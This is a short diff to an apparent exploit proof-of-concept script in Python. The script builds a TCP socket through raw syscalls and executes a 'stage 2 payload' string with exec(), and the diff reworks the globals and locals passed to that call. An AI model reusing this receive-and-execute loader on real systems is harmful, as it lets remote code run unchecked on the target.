@@ -1188,6 +1188,9 @@ enable_buf = bytearray(b"\0" * 4)
 nogc.append(enable_buf)
 
 
+SHARED_VARS = {}
+
+
 def create_tcp_socket(sc):
     enable_buf[0:4] = struct.pack("<I", 1)  # enable option
     sockaddr_in[0:16] = b"\0" * 16
@@ -1304,9 +1307,10 @@ def poc():
         sc.syscalls.close(client_sock)  # close client socket
 
         # Execute stage 2, mimic file-exec by throwing local/global in same scope
-        scope = dict(locals(), **globals())
+        global_scope = dict(globals())
+        local_scope = dict(locals())
         try:
-            exec(stage2_str, scope, scope)
+            exec(stage2_str, global_scope, local_scope)
             print("Stage 2 payload executed successfully")
         except Exception as e:
             exc_msg = traceback.format_exc()
